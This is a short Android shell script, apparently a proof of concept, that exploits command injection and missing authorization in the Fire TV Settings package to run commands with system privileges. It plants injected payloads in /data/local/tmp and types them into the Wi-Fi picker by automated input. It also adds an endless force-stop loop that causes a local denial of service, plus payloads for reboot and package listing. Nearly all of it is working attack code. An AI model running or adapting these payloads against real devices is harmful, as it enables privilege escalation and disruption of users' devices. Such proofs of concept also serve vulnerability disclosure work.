# Using CWE 78 (Improper Neutralization Of Special Elements Used In A Command), CWE 862 (Missing Authoization) 
# to get [system] privileges, and execute commands (CMi) 


# Force-close the sub-package Settings app, then sleep
am force-stop com.amazon.tv.settings.core
sleep 1

# Use file redirection to pass over to /data/local/tmp
echo "A';id>/data/local/tmp/cmi_proof.sh;'" > /data/local/tmp/payload.sh

# Launch the sub-package again
am start -p com.amazon.tv.settings.core -a android.net.wifi.PICK_WIFI_NETWORK

# Force-read the file (triggers the CMi)
read -r RECON < /data/local/tmp/payload.sh

# Forcing 'Submit' to work without pressing it
input text "$RECON"
sleep 1
input text "\n"
# Causing an LDoS on the Settings sub-package using CWE 755 (Improper Handling Of System Disruptions)
while :; do
    am force-stop com.amazon.tv.settings.core
    sleep 0.2
    am start -p com.amazon.tv.settings.core -a android.net.wifi.PICK_WIFI_NETWORK
    sleep 0.5
done

# Here's more I can do as [system]:
echo "A';reboot>/data/local/tmp/cmi_proof.sh;'" > /data/local/tmp/payload.sh
echo "A';pm path com.amazon.cloud9>/data/local/tmp/cmi_proof.sh;'" > /data/local/tmp/payload.sh
echo "A';pm list packages>/data/local/tmp/cmi_proof.sh;'" > /data/local/tmp/payload.sh

# After you do the above steps, you run:
ls -la /data/local/tmp
cat /data/local/tmp/payload.txt
